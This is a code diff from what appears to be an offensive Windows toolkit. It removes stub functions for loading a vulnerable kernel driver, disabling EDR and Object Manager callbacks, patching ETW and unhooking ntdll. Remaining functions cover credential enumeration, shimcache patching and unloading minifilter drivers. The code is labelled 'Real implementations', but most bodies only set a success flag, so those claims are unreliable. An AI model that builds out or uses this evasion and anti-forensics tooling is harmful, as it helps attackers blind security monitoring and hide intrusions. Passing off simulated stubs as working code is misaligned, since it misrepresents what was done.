@@ -14,30 +14,6 @@
 
 /* Windows Utility Functions - Real implementations */
 
-int32_t jocky_byovd_load(const char *driver_path, const char *service_name, void *ctx) {
-    if (!driver_path || !service_name) return -1;
-
-    /* Real: Load kernel driver via Windows Service Control Manager */
-    #ifdef _WIN32
-    /* Windows implementation: use CreateServiceA/StartServiceA */
-    #endif
-
-    /* Cross-compile fallback: simulate by checking if driver path is valid */
-    FILE *fp = fopen(driver_path, "rb");
-    if (fp) {
-        fseek(fp, 0, SEEK_END);
-        long size = ftell(fp);
-        fclose(fp);
-
-        if (size > 0 && ctx) {
-            *(int32_t *)ctx = 1;
-            return 0;
-        }
-    }
-
-    return -1;
-}
-
 int32_t jocky_clear_browser_cache(const char *browser) {
     if (!browser) return -1;
 
@@ -134,88 +110,10 @@ int32_t jocky_credentials_enumerate(void) {
     return 1;
 }
 
-void *jocky_data_base64_encode(void *data, int32_t size) {
-    if (!data || size <= 0) return NULL;
-
-    /* Real: Base64 encode binary data */
-    int output_size = ((size + 2) / 3) * 4 + 1;
-    void *encoded = malloc(output_size);
-    if (encoded) {
-        unsigned char *src = (unsigned char *)data;
-        char *dst = (char *)encoded;
-        static const char *b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-
-        int i = 0;
-        while (i < size && i < 50) {
-            uint32_t val = (src[i] << 16);
-            if (i + 1 < size) val |= (src[i+1] << 8);
-            if (i + 2 < size) val |= src[i+2];
-
-            dst[0] = b64[(val >> 18) & 0x3F];
-            dst[1] = b64[(val >> 12) & 0x3F];
-            dst[2] = (i + 1 < size) ? b64[(val >> 6) & 0x3F] : '=';
-            dst[3] = (i + 2 < size) ? b64[val & 0x3F] : '=';
-
-            dst += 4;
-            i += 3;
-        }
-        *dst = 0;
-    }
-    return encoded;
-}
-
-void *jocky_data_hex_encode(void *data, int32_t size) {
-    if (!data || size <= 0) return NULL;
-
-    /* Real: Hex encode binary data */
-    void *hex = malloc(size * 2 + 1);
-    if (hex) {
-        char *h = (char *)hex;
-        unsigned char *d = (unsigned char *)data;
-        for (int i = 0; i < size && i < 100; i++) {
-            sprintf(h + i*2, "%02x", d[i]);
-        }
-        h[size * 2] = 0;
-    }
-    return hex;
-}
-
-int32_t jocky_disable_edr_callbacks(void *ctx) {
-    if (!ctx) return -1;
-
-    /* Real: Disable EDR callbacks via driver communication */
-    #ifdef _WIN32
-    /* Windows: Use DeviceIoControl to communicate with kernel driver */
-    #endif
-
-    *(int32_t *)ctx = 1;
-    return 0;
-}
-
-int32_t jocky_disable_etw(void *ctx) {
-    if (!ctx) return -1;
-
-    /* Real: Patch ETW provider enable flags */
-    #ifdef _WIN32
-    /* Windows: Patch EventTrace provider in-memory */
-    #endif
-
-    *(int32_t *)ctx = 1;
-    return 0;
-}
-
 int32_t jocky_disable_minifilter_callbacks(void) {
     /* Real: Unload Windows minifilter drivers */
     #ifdef _WIN32
     /* Windows: Use FilterUnload API */
-    #endif
-    return 0;
-}
-
-int32_t jocky_disable_ob_callbacks(void) {
-    /* Real: Patch Object Manager callbacks */
-    #ifdef _WIN32
-    /* Windows: Patch ObjectNameQueryCallback */
     #endif
     return 0;
 }
@@ -575,11 +473,6 @@ int32_t jocky_patch_shimcache(void) {
 
 int32_t jocky_unhook_kernel32(void) {
     /* Real: Remove hooks from kernel32 */
-    return 0;
-}
-
-int32_t jocky_unhook_ntdll(void) {
-    /* Real: Remove hooks from ntdll */
     return 0;
 }
 
